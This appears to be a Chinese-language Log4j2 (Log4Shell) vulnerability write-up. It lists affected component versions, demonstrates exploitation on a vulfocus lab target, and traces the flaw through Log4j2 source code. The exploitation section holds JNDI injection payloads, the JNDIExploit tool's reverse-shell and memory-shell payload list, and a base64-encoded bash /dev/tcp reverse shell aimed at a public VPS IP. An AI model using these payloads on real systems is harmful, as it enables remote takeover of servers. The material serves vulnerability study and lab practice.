‘2.1.18.RELEASE’, ‘2.1.17.RELEASE’, ‘2.1.16.RELEASE’, ‘2.1.15.RELEASE’, ‘2.1.14.RELEASE’, ‘2.1.13.RELEASE’, ‘2.1.12.RELEASE’, ‘2.1.11.RELEASE’, ‘2.1.10.RELEASE’, ‘2.1.9.RELEASE’, ‘2.1.8.RELEASE’, ‘2.1.7.RELEASE’, ‘2.1.6.RELEASE’, ‘2.1.5.RELEASE’, ‘2.1.4.RELEASE’, ‘2.1.3.RELEASE’, ‘2.1.2.RELEASE’, ‘2.1.1.RELEASE’, ‘2.1.0.RELEASE’, ‘2.0.9.RELEASE’, ‘2.0.8.RELEASE’, ‘2.0.7.RELEASE’, ‘2.0.6.RELEASE’, ‘2.0.5.RELEASE’, ‘2.0.4.RELEASE’, ‘2.0.3.RELEASE’, ‘2.0.2.RELEASE’, ‘2.0.1.RELEASE’, ‘2.0.0.RELEASE’, ‘1.5.22.RELEASE’, ‘1.5.21.RELEASE’, ‘1.5.20.RELEASE’, ‘1.5.19.RELEASE’, ‘1.5.18.RELEASE’, ‘1.5.17.RELEASE’, ‘1.5.16.RELEASE’, ‘1.5.15.RELEASE’, ‘1.5.14.RELEASE’, ‘1.5.13.RELEASE’, ‘1.5.12.RELEASE’, ‘1.5.11.RELEASE’, ‘1.5.10.RELEASE’, ‘1.5.9.RELEASE’, ‘1.5.8.RELEASE’, ‘1.5.7.RELEASE’, ‘1.5.6.RELEASE’, ‘1.5.5.RELEASE’, ‘1.5.4.RELEASE’, ‘1.5.3.RELEASE’, ‘1.5.2.RELEASE’, ‘1.5.1.RELEASE’, ‘1.5.0.RELEASE’, ‘1.4.7.RELEASE’, ‘1.4.6.RELEASE’, ‘1.4.5.RELEASE’, ‘1.4.4.RELEASE’, ‘1.4.3.RELEASE’, ‘1.4.2.RELEASE’, ‘1.4.1.RELEASE’, ‘1.4.0.RELEASE’, ‘1.3.8.RELEASE’, ‘1.3.7.RELEASE’, ‘1.3.6.RELEASE’, ‘1.3.5.RELEASE’, ‘1.3.4.RELEASE’, ‘1.3.3.RELEASE’, ‘1.3.2.RELEASE’, ‘1.3.1.RELEASE’, ‘1.3.0.RELEASE’, ‘1.2.8.RELEASE’, ‘1.2.7.RELEASE’, ‘1.2.6.RELEASE’, ‘1.2.5.RELEASE’, ‘1.2.4.RELEASE’, ‘1.2.3.RELEASE’, ‘1.2.2.RELEASE’, ‘1.2.1.RELEASE’, ‘1.2.0.RELEASE’, ‘1.1.12.RELEASE’, ‘1.1.11.RELEASE’, ‘1.1.10.RELEASE’, ‘1.1.9.RELEASE’, ‘1.1.8.RELEASE’, ‘1.1.7.RELEASE’, ‘1.1.6.RELEASE’, ‘1.1.5.RELEASE’, ‘1.1.4.RELEASE’, ‘1.1.3.RELEASE’, ‘1.1.2.RELEASE’, ‘1.1.1.RELEASE’, ‘1.1.0.RELEASE’, ‘1.0.2.RELEASE’, ‘1.0.1.RELEASE’, ‘1.0.0.RELEASE’ Camel :: Core ‘3.13.0’, ‘3.12.0’, ‘3.11.4’, ‘3.11.3’, ‘3.11.2’, ‘3.11.1’, ‘3.11.0’, ‘3.10.0’, ‘3.9.0’, ‘3.8.0’, ‘3.7.6’, ‘3.7.5’, ‘3.7.4’, ‘3.7.3’, ‘3.7.2’, ‘3.7.1’, ‘3.7.0’, ‘3.6.0’, ‘3.5.0’, ‘3.4.6’, ‘3.4.5’, ‘3.4.4’, ‘3.4.3’, ‘3.4.2’, ‘3.4.1’, ‘3.4.0’, ‘3.3.0’, ‘3.2.0’, ‘3.1.0’, ‘3.0.1’, ‘3.0.0’, ‘2.25.4’, ‘2.25.3’, ‘2.25.2’, ‘2.25.1’, ‘2.25.0’, ‘2.24.3’, ‘2.24.2’, ‘2.24.1’, ‘2.24.0’, ‘2.23.4’, ‘2.23.3’, ‘2.23.2’, ‘2.23.1’, ‘2.23.0’, ‘2.22.5’, ‘2.22.4’, ‘2.22.3’, ‘2.22.2’, ‘2.22.1’, ‘2.22.0’, ‘2.21.5’, ‘2.21.4’, ‘2.21.3’, ‘2.21.2’, ‘2.21.1’, ‘2.21.0’, ‘2.20.4’, ‘2.20.3’, ‘2.20.2’, ‘2.20.1’, ‘2.20.0’, ‘2.19.5’, ‘2.19.4’, ‘2.19.3’, ‘2.19.2’, ‘2.19.1’, ‘2.19.0’, ‘2.18.5’, ‘2.18.4’, ‘2.18.3’, ‘2.18.2’, ‘2.18.1’, ‘2.18.0’, ‘2.17.7’, ‘2.17.6’, ‘2.17.5’, ‘2.17.4’, ‘2.17.3’, ‘2.17.2’, ‘2.17.1’, ‘2.17.0’, ‘2.16.5’, ‘2.16.4’, ‘2.16.3’, ‘2.16.2’, ‘2.16.1’, ‘2.16.0’, ‘2.15.6’, ‘2.15.5’, ‘2.15.4’, ‘2.15.3’, ‘2.15.2’, ‘2.15.1’, ‘2.15.0’, ‘2.14.4’, ‘2.14.3’, ‘2.14.2’, ‘2.14.1’, ‘2.14.0’, ‘2.13.4’, ‘2.13.3’, ‘2.13.2’, ‘2.13.1’, ‘2.13.0’, ‘2.12.5’, ‘2.12.4’, ‘2.12.3’, ‘2.12.2’, ‘2.12.1’, ‘2.12.0’, ‘2.11.4’, ‘2.11.3’, ‘2.11.2’, ‘2.11.1’, ‘2.11.0’, ‘2.10.7’, ‘2.10.6’, ‘2.10.5’, ‘2.10.4’, ‘2.10.3’, ‘2.10.2’, ‘2.10.1’, ‘2.10.0’, ‘2.9.8’, ‘2.9.7’, ‘2.9.6’, ‘2.9.5’, ‘2.9.4’, ‘2.9.3’, ‘2.9.2’, ‘2.9.1’, ‘2.9.0’, ‘2.8.6’, ‘2.8.5’, ‘2.8.4’, ‘2.8.3’, ‘2.8.2’, ‘2.8.1’, ‘2.8.0’, ‘2.7.5’, ‘2.7.4’, ‘2.7.3’, ‘2.7.2’, ‘2.7.1’, ‘2.7.0’, ‘2.6.0’, ‘2.5.0’, ‘2.4.0’, ‘2.3.0’, ‘2.2.0’, ‘2.1.0’, ‘2.0.0’, ‘1.6.4’, ‘1.6.3’, ‘1.6.2’, ‘1.6.1’, ‘1.6.0’, ‘1.5.0’, ‘1.4.0’, ‘1.3.0’, ‘1.2.0’, ‘1.1.0’, ‘1.0.0’, ‘3.0.0-M4’, ‘3.0.0-M3’, ‘3.0.0-M2’, ‘3.0.0-M1’, ‘2.0-M3’, ‘2.0-M2’, ‘2.0-M1’, ‘3.0.0-RC3’, ‘3.0.0-RC2’, ‘3.0.0-RC1’, ‘2.9.0-RC1’ JUnit Vintage Engine ‘5.8.2’, ‘5.8.1’, ‘5.8.0’, ‘5.7.2’, ‘5.7.1’, ‘5.7.0’, ‘5.6.3’, ‘5.6.2’, ‘5.6.1’, ‘5.6.0’, ‘5.5.2’, ‘5.5.1’, ‘5.5.0’, ‘5.4.2’, ‘5.4.1’, ‘5.4.0’, ‘5.3.2’, ‘5.3.1’, ‘5.3.0’, ‘5.2.0’, ‘5.1.1’, ‘5.1.0’, ‘4.12.3’, ‘4.12.2’, ‘4.12.1’, ‘4.12.0’, ‘5.8.0-M1’, ‘5.7.0-M1’, ‘5.6.0-M1’, ‘5.5.0-M1’, ‘5.4.0-M1’, ‘5.3.0-M1’, ‘5.2.0-M1’, ‘5.1.0-M2’, ‘5.1.0-M1’, ‘4.12.0-M6’, ‘4.12.0-M5’, ‘4.12.0-M4’, ‘4.12.0-M3’, ‘4.12.0-M2’, ‘4.12.0-M1’, ‘5.8.0-RC1’, ‘5.7.0-RC1’, ‘5.6.0-RC1’, ‘5.5.0-RC2’, ‘5.5.0-RC1’, ‘5.4.0-RC2’, ‘5.4.0-RC1’, ‘5.3.0-RC1’, ‘5.2.0-RC1’, ‘5.1.0-RC1’, ‘4.12.0-RC3’, ‘4.12.0-RC2’, ‘4.12.0-RC1’ JBoss Logging 3 ‘3.4.2.Final’, ‘3.4.1.Final’, ‘3.4.0.Final’, ‘3.3.3.Final’, ‘3.3.2.Final’, ‘3.3.1.Final’, ‘3.3.0.Final’, ‘3.2.1.Final’, ‘3.2.0.Final’, ‘3.1.0.CR2’, ‘3.1.0.CR1’, ‘3.0.0.CR1’, ‘3.3.0.Beta1’, ‘3.2.0.Beta1’, ‘3.1.0.Beta3’, ‘3.1.0.Beta2’, ‘3.1.0.Beta1’, ‘3.0.0.Beta5’, ‘3.0.0.Beta4’, ‘3.0.0.Beta3’, ‘3.0.0.Beta2’, ‘3.0.0.Beta1’ HikariCP ‘5.0.0’, ‘4.0.3’, ‘4.0.2’, ‘4.0.1’, ‘4.0.0’, ‘3.4.5’, ‘3.4.4’, ‘3.4.3’, ‘3.4.2’, ‘3.4.1’, ‘3.4.0’, ‘3.3.1’, ‘3.3.0’, ‘3.2.0’, ‘3.1.0’, ‘3.0.0’, ‘2.7.9’, ‘2.7.8’, ‘2.7.7’, ‘2.7.6’, ‘2.7.5’, ‘2.7.4’, ‘2.7.3’, ‘2.7.2’, ‘2.7.1’, ‘2.7.0’, ‘2.6.3’, ‘2.6.2’, ‘2.6.1’, ‘2.6.0’, ‘2.5.1’, ‘2.5.0’, ‘2.4.7’, ‘2.4.6’, ‘2.4.5’, ‘2.4.4’, ‘2.4.3’, ‘2.4.2’, ‘2.4.1’, ‘2.4.0’, ‘2.3.13’, ‘2.3.12’, ‘2.3.11’, ‘2.3.10’, ‘2.3.9’, ‘2.3.8’, ‘2.3.7’, ‘2.3.6’, ‘2.3.5’, ‘2.3.4’, ‘2.3.3’, ‘2.3.2’, ‘2.3.1’, ‘2.3.0’, ‘2.2.5’, ‘2.2.4’, ‘2.2.3’, ‘2.2.2’, ‘2.2.1’, ‘2.2.0’, ‘2.1.0’, ‘2.0.1’, ‘2.0.0’, ‘1.4.0’, ‘1.3.9’, ‘1.3.8’, ‘1.3.7’, ‘1.3.6’, ‘1.3.5’, ‘1.3.4’, ‘1.3.3’, ‘1.3.2’, ‘1.3.1’, ‘1.3.0’, ‘1.2.9’, ‘1.2.8’, ‘1.2.7’, ‘1.2.6’, ‘1.2.5’, ‘1.2.4’, ‘1.2.3’, ‘1.2.2’, ‘1.2.1’, ‘1.1.9’, ‘1.1.8’, ‘1.1.7’, ‘1.1.6’, ‘1.1.5’, ‘1.1.4’, ‘1.1.3’ Logging ‘1.1.0’, ‘1.0.0’, ‘0.6.0’, ‘0.5.0’, ‘0.4.1’, ‘0.4.0’, ‘0.3.1’, ‘0.3.0’, ‘0.2.6’, ‘0.2.4’, ‘0.2.3’, ‘0.2.2’, ‘0.2.0’, ‘0.1.2’, ‘0.1.1’, ‘0.1.0’, ‘0.5.0-alpha.1’, ‘0.5.0-alpha’ Jedis ‘3.7.0’, ‘3.6.3’, ‘3.6.2’, ‘3.6.1’, ‘3.6.0’, ‘3.5.2’, ‘3.5.1’, ‘3.5.0’, ‘3.4.1’, ‘3.4.0’, ‘3.3.0’, ‘3.2.0’, ‘3.1.0’, ‘3.0.1’, ‘3.0.0’, ‘2.10.2’, ‘2.10.1’, ‘2.10.0’, ‘2.9.3’, ‘2.9.2’, ‘2.9.1’, ‘2.9.0’, ‘2.8.2’, ‘2.8.1’, ‘2.8.0’, ‘2.7.3’, ‘2.7.2’, ‘2.7.1’, ‘2.7.0’, ‘2.6.3’, ‘2.6.2’, ‘2.6.1’, ‘2.6.0’, ‘2.5.2’, ‘2.5.1’, ‘2.5.0’, ‘2.4.2’, ‘2.4.1’, ‘2.4.0’, ‘2.3.1’, ‘2.3.0’, ‘2.2.1’, ‘2.2.0’, ‘2.1.0’, ‘2.0.0’, ‘1.5.2’, ‘1.5.1’, ‘1.5.0’, ‘1.4.0’, ‘1.3.1’, ‘1.3.0’, ‘jedis-3.6.2’, ‘3.1.0-m4’, ‘3.1.0-m3’, ‘3.1.0-m2’, ‘3.1.0-m1’, ‘3.0.0-m1’, ‘2.10.0-m1’, ‘3.7.0-RC1’, ‘3.6.0-RC1’, ‘3.1.0-rc2’, ‘3.1.0-rc’, ‘3.0.1-rc1’, ‘3.0.0-rc1’, ‘2.10.0-rc1’, ‘1.5.0-RC2’, ‘1.5.0-RC1’, ‘4.0.0-beta4’, ‘4.0.0-beta3’, ‘4.0.0-beta2’, ‘4.0.0-beta1’ WSO2 Carbon Kernel Core ‘5.2.13’, ‘5.2.8’, ‘5.2.7’, ‘5.2.6’, ‘5.2.5’, ‘5.2.4’, ‘5.2.3’, ‘5.2.2’, ‘5.2.1’, ‘4.6.2’, ‘4.6.1’, ‘4.6.0’, ‘4.5.1’, ‘4.4.37’, ‘4.4.36’, ‘4.4.35’, ‘4.4.34’, ‘4.4.33’, ‘4.4.32’, ‘4.4.31’, ‘4.4.30’, ‘4.4.29’, ‘4.4.28’, ‘4.4.27’, ‘4.4.26’, ‘4.4.25’, ‘4.4.24’, ‘4.4.23’, ‘4.4.22’, ‘4.4.21’, ‘4.4.20’, ‘4.4.19’, ‘4.7.0-m6’, ‘4.7.0-m5’, ‘4.7.0-m4’, ‘4.7.0-m3’, ‘4.7.0-m2’, ‘4.7.0-m1’, ‘4.6.3-m5’, ‘4.6.3-m4’, ‘4.6.3-m3’, ‘4.6.3-m2’, ‘4.6.3-m1’, ‘4.6.2-m9’, ‘4.6.2-m8’, ‘4.6.2-m7’, ‘4.6.2-m6’, ‘4.6.2-m5’, ‘4.6.2-m4’, ‘4.6.2-m3’, ‘4.6.2-m2’, ‘4.6.2-m1’, ‘4.6.1-m8’, ‘4.6.1-m7’, ‘4.6.1-m6’, ‘4.6.1-m5’, ‘4.6.1-m4’, ‘4.6.1-m3’, ‘4.6.1-m2’, ‘4.6.1-m1’, ‘4.6.1-beta2’, ‘4.6.1-beta’, ‘4.6.0-beta2’, ‘4.6.1-alpha3’, ‘4.6.1-alpha2’, ‘4.6.1-alpha’, ‘4.6.0-alpha2’, ‘4.6.0-alpha’ 以上应用/组件受影响版本统计数据来自：微步情报局 微步在线研究响应中心 0x04 漏洞演示 演示靶场采用vulfocus在线平台的log4j2-rce靶场，该靶场漏洞位置存在于/hello路径 vulfocus的log4j2-rce靶场的请求数据包如下： GET /hello?payload=111 HTTP/1.1 Host: vulfocus.fofa.so:30861 Content-Type: application/x-www-form-urlencoded Content-Length: 147 漏洞验证过程使用dnslog、burpsuite、JNDIExploit以及拥有公网ip的vps的服务器，建议java依赖环境采用jdk8u191以下版本进行复现。 dnslog：http://www.dnslog.cn/ JNDIExploit：https://github.com/feihong-cs/JNDIExploit jdk8：https://www.wmzhe.com/soft-70159.html 0x05 漏洞检测 1. dnslog手动验证 首先在dnslog平台生成一个地址，然后利用该地址构造payload让靶机对dnslog平台发起请求： 传入payload：payload=%24%7Bjndi%3Aldap%3A%2F%2Fauks48.dnslog.cn%7D --记得url编码 请求成功后，dnslog平台点击 Refresh Record 后会接收靶机的请求，记录了靶机的请求的ip地址以及响应时间 通过上述步骤验证，在演示靶场环境中可以确定漏洞是真实存在的，但在真实环境中只能说初步判断目标是有大概率存在漏洞的，由于真实环境中的一些复杂因素，即使dnslog请求成功了也不能完全保证目标一定存在rce漏洞。 2. 漏洞利用 1. JNDIExploit JNDIExploit是一款用于 JNDI注入 利用的工具，大量参考/引用了 Rogue JNDI 项目的代码，支持直接植入内存shell，并集成了常见的bypass 高版本JDK的方式，适用于与自动化工具配合使用。 下载地址: https://pan.baidu.com/s/1lmday3MHoPHI5f9rHNjV2Q 提取码: 5686 使用 java -jar JNDIExploit.jar -u 查看支持的 LDAP 格式 Supported LADP Queries * all words are case INSENSITIVE when send to ldap server [+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g. ldap://127.0.0.1:1389/Basic/Dnslog/[domain] ldap://127.0.0.1:1389/Basic/Command/[cmd] ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd] ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port] ---windows NOT supported ldap://127.0.0.1:1389/Basic/TomcatEcho ldap://127.0.0.1:1389/Basic/SpringEcho ldap://127.0.0.1:1389/Basic/WeblogicEcho ldap://127.0.0.1:1389/Basic/TomcatMemshell1 ldap://127.0.0.1:1389/Basic/TomcatMemshell2 ---need extra header [Shell: true] ldap://127.0.0.1:1389/Basic/JettyMemshell ldap://127.0.0.1:1389/Basic/WeblogicMemshell1 ldap://127.0.0.1:1389/Basic/WeblogicMemshell2 ldap://127.0.0.1:1389/Basic/JBossMemshell ldap://127.0.0.1:1389/Basic/WebsphereMemshell ldap://127.0.0.1:1389/Basic/SpringMemshell [+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g. ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain] ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain] ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd] ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port] ---windows NOT supported ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1 ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1 ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2 ---ALSO support other memshells [+] TomcatBypass Queries ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain] ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd] ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd] ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port] ---windows NOT supported ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho ldap://127.0.0.1:1389/TomcatBypass/SpringEcho ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1 ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2 ---need extra header [Shell: true] ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell [+] GroovyBypass Queries ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd] ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd] [+] WebsphereBypass Queries ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory] ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain] ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd] ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd] ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port] ---windows NOT supported ldap://127.0.0.1:1389/WebsphereBypass/Upload/WebsphereMemshell ldap://127.0.0.1:1389/WebsphereBypass/RCE/path=[uploaded_jar_path] ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp 目前支持的所有 PayloadType 为 Dnslog: 用于产生一个DNS请求，与 DNSLog平台配合使用，对Linux/Windows进行了简单的适配 Command: 用于执行命令，如果命令有特殊字符，支持对命令进行 Base64编码后传输 ReverseShell: 用于 Linux 系统的反弹shell，方便使用 TomcatEcho: 用于在中间件为 Tomcat 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令 SpringEcho: 用于在框架为 SpringMVC/SpringBoot 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令 WeblogicEcho: 用于在中间件为 Weblogic 时命令执行结果的回显，通过添加自定义header cmd: whoami 的方式传递想要执行的命令 TomcatMemshell1: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shell TomcatMemshell2: 用于植入Tomcat内存shell， 支持Behinder shell 与 Basic cmd shell, 使用时需要添加额外的HTTP Header Shell: true, 推荐使用此方式 SpringMemshell: 用于植入Spring内存shell， 支持Behinder shell 与 Basic cmd shell WeblogicMemshell1: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shell WeblogicMemshell2: 用于植入Weblogic内存shell， 支持Behinder shell 与 Basic cmd shell，推荐使用此方式 JettyMemshell: 用于植入Jetty内存shell， 支持Behinder shell 与 Basic cmd shell JBossMemshell: 用于植入JBoss内存shell， 支持Behinder shell 与 Basic cmd shell WebsphereMemshell: 用于植入Websphere内存shell， 支持Behinder shell 与 Basic cmd shell 目前支持的所有 GadgetType 为 1.URLDNS 2.CommonsBeanutils1 3.CommonsBeanutils2 4.CommonsCollectionsK1 5.CommonsCollectionsK2 6.C3P0 7.Jdk7u21 8.Jre8u20 9.CVE_2020_2551 10CVE_2020_2883 WebsphereBypass 中的 3 个动作： 1.list：基于XXE查看目标服务器上的目录或文件内容 2.upload：基于XXE的jar协议将恶意jar包上传至目标服务器的临时目录 3.rce：加载已上传至目标服务器临时目录的jar包，从而达到远程代码执行的效果（这一步本地未复现成功，抛4.java.lang.IllegalStateException: For application client runtime, the client factory execute on a managed server thread is not allowed.异常，有复现成功的小伙伴麻烦指导下） 2. VPS部署ldap服务 将JNDI注入工具传到vps服务器上并执行如下命令 反弹shell指令： bash -i &gt;&amp; /dev/tcp/your-ip/自己设置的监听端口号 0&gt;&amp;1 JNDI启动方法： java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMzcvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}\" -A xxx.xxx.xxx.xxx 这个地方是反弹shell指令经过base64编码后所得。这串代码里只需改此处和最后面服务器的IP -C是执行的bash命令，-c参数后面是执行的具体命令，用双引号引起来 -A 指服务器的IP 将反弹shell指令base64编码后，将一整串启动JNDI代码在vps中运行 这里使用 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}\" -A 124.220.233.26 使用burpsuit抓包，替换payload rmi://124.220.233.26:1099/29h4wg ${jndi:rmi://124.220.233.26:1099/29h4wg} //记得url编码 成功反弹shell 找到flag 0x06 Log4j2源码浅析 Log4j2是Apache的一个开源项目，通过使用Log4j2，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。 从上面的解释中我们可以看到Log4j2的功能十分强大，这里会简单分析其与漏洞相关联部分的源码实现，来更熟悉Log4j2的漏洞产生原因。 我们使用maven来引入相关组件的2.14.0版本，在工程的pom.xml下添加如下配置，他会导入两个jar包(这里是跟着文章走的，暂时不实操了，用脑子复现一波) &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.0&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 在工程目录resources下创建log4j2.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;configuration status=\"error\"&gt; &lt;appenders&gt; &lt;!-- 配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt; &lt;Console name=\"Console\" target=\"SYSTEM_OUT\" &gt; &lt;!-- 配置Console的模式布局--&gt; &lt;PatternLayout pattern=\"%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n\"/&gt; &lt;/Console&gt; &lt;/appenders&gt; &lt;loggers&gt; &lt;root level=\"error\"&gt; &lt;appender-ref ref=\"Console\"/&gt; &lt;/root&gt; &lt;/loggers&gt; &lt;/configuration&gt; log4j2中包含两个关键组件LogManager和LoggerContext。LogManager是Log4J2启动的入口，可以初始化对应的LoggerContext。LoggerContext会对配置文件进行解析等其它操作。 在不使用slf4j的情况下常见的Log4J用法是从LogManager中获取Logger接口的一个实例，并调用该接口上的方法。运行下列代码查看打印结果 import org.apache.logging.log4j.LogManager;//导入所需的包这里导入了 Apache Log4j 2.x 的 LogManager 和 Logger 类。 import org.apache.logging.log4j.Logger; //声明 Logger 对象，创建了一个静态的 Logger 对象 logger，使用 LogManager.getLogger() 方法初始化。 //Logger 对象用于记录日志。 public class log4j2Rce2 { private static final Logger logger = LogManager.getLogger(log4j2Rce2.class); //上述静态对象的初始化：创建一个 Logger 对象，并将其与当前的 log4j2Rce2 类关联起来，以便在该类中记录日志。 public static void main(String[] args) { String a=\"${java:os}\"; logger.error(a); } } //在 main 方法中，定义了一个字符串变量 a 并赋值为 \"${java:os}\"。然后，使用 logger 的 error() 方法将字符串 a 记录为错误日志。 属性占位符之Interpolator插值器 log4j2中环境变量键值对被封装为了StrLookup对象。这些变量的值可以通过属性占位符来引用，格式为:${prefix:key}。在Interpolator插值器内部以Map的方式则封装了多个StrLookup对象，如下图显示： 详细信息可以查看官方文档。这些实现类存在于org.apache.logging.log4j.core.lookup包下。 当参数占位符${prefix:key}带有prefix前缀时，Interpolator会从指定prefix对应的StrLookup实例中进行key查询。当参数占位符${key}没有prefix时，Interpolator则会从默认查找器中进行查询。如使用${jndi:key}时，将会调用JndiLookup的lookup方法 使用jndi(javax.naming)获取value。如下图演示。 模式布局 log4j2支持通过配置Layout打印格式化的指定形式日志，可以在Appenders的后面附加Layouts来完成这个功能。常用之一有PatternLayout，也就是我们在配置文件中PatternLayout字段所指定的属性pattern的值%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n。 %msg表示所输出的消息，其它格式化字符所表示的意义可以查看官方文档。 PatternLayout模式布局会通过PatternProcessor模式解析器，对模式字符串进行解析，得到一个List&lt;PatternConverter&gt;转换器列表和List&lt;FormattingInfo&gt;格式信息列表。在配置文件PatternLayout标签的pattern属性中我们可以看到类似%d的写法，d代表一个转换器名称，log4j2会通过PluginManager收集所有类别为Converter的插件,同时分析插件类上的@ConverterKeys注解,获取转换器名称,并建立名称到插件实例的映射关系，当PatternParser识别到转换器名称的时候,会查找映射。相关转换器名称注解和加载的插件实例如下图所示： 本次漏洞关键在于转换器名称msg对应的插件实例为MessagePatternConverter对于日志中的消息内容处理存在问题，这部分是攻击者可控的。MessagePatternConverter会将日志中的消息内容为${prefix:key}格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。 日志级别 log4j2支持种日志级别，通过日志级别我们可以将日志信息进行分类，在合适的地方输出对应的日志。哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。级别由高到低共分为6个：fatal(致命的), error, warn, info, debug, trace(堆栈)。 log4j2还定义了一个内置的标准级别intLevel，由数值表示，级别越高数值越小。 当日志级别（调用）大于等于系统设置的intLevel的时候，log4j2才会启用日志打印。在存在配置文件的时候 ，会读取配置文件中&lt;root level=\"error\"&gt;值设置intLevel。当然我们也可以通过Configurator.setLevel(\"当前类名\", Level.INFO);来手动设置。如果没有配置文件也没有指定则会默认使用Error级别，也就是200，如下图中的处理： 0x07 漏洞原理 首先先来看一下网络上流传最多的payload ${jndi:ldap://2lnhn2.ceye.io} 而触发漏洞的方法，大家都是以Logger.error()方法来进行演示，那这里我们也采用同样的方式来讲解，具体漏洞环境代码如下所示 import org.apache.logging.log4j.Level; import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; import org.apache.logging.log4j.core.config.Configurator; public class Log4jTEst { public static void main(String[] args) { Logger logger = LogManager.getLogger(Log4jTEst.class); logger.error(\"${jndi:ldap://2lnhn2.ceye.io}\"); } } 直击漏洞本源，将断点断在org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java中的directEncodeEvent方法上，该方法的第一行代码将返回当前使用的布局，并调用对应布局处理器的encode方法。log4j2默认布局使用的是PatternLayout，如下图所示： 继续跟进在encode中会调用toText方法，根据注释，该方法的作用为创建指定日志事件的文本表示形式，并将其写入指定的StringBuilder中。 接下来会调用serializer.toSerializable，并在这个方法中调用不同的Converter来处理传入的数据，如下图所示， 这里整理了一下调用的Converter org.apache.logging.log4j.core.pattern.DatePatternConverter org.apache.logging.log4j.core.pattern.LiteralPatternConverter org.apache.logging.log4j.core.pattern.ThreadNamePatternConverter org.apache.logging.log4j.core.pattern.LevelPatternConverter org.apache.logging.log4j.core.pattern.LoggerPatternConverter org.apache.logging.log4j.core.pattern.MessagePatternConverter //消息模式转换器 org.apache.logging.log4j.core.pattern.LineSeparatorPatternConverter org.apache.logging.log4j.core.pattern.ExtendedThrowablePatternConverter 这么多Converter都将一个个通过上图中的for循环对日志事件进行处理，当调用到MessagePatternConverter时，我们跟入MessagePatternConverter.format()方法中一探究竟 在MessagePatternConverter.format()方法中对日志消息进行格式化，其中很明显的看到有针对字符\"{\"，这三行代码中关键点在于最后一行 这里我圈了几个重点，有助于理解Log4j2 为什么会用JndiLookup，它究竟想要做什么。此时的workingBuilder是一个StringBuilder对象，该对象存放的字符串如下所示 09:54:48.329 [main] ERROR com.Test.log4j.Log4jTEst - ${jndi:ldap://2lnhn2.ceye.io} 本来这段字符串的长度是82，但是却给它改成了53，为什么呢？因为第五十三的位置就是$符号，也就是说${jndi:ldap://2lnhn2.ceye.io}这段不要了，从第53位开始append。而append的内容是什么呢？可以看到传入的参数是config.getStrSubstitutor().replace(event, value)的执行结果，其中的value就是${jndi:ldap://2lnhn2.ceye.io}这段字符串。replace的作用简单来说就是想要进行一个替换，我们继续跟进 